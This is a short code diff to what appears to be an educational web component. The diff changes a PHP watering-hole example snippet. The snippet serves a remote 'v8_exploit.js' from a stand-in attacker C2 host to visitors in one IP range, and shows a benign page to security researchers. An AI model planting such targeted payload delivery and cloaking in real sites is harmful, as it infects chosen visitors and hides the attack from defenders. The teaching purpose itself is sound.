@@ -41,7 +41,7 @@ const Topic5 = () => {
       codeSnippet: `// Watering Hole IP Filtering Script (PHP):
 $client_ip = $_SERVER['REMOTE_ADDR'];
 if (is_in_range($client_ip, "103.25.10.0/24")) {
-    echo "<script src='https://c2.evil-host.in/v8_exploit.js'></script>"; // Target Infected!
+    echo "<script src='https://attacker-c2.net/v8_exploit.js'></script>"; // Target Infected!
 } else {
     // Return standard benign page to external security researchers
 }`
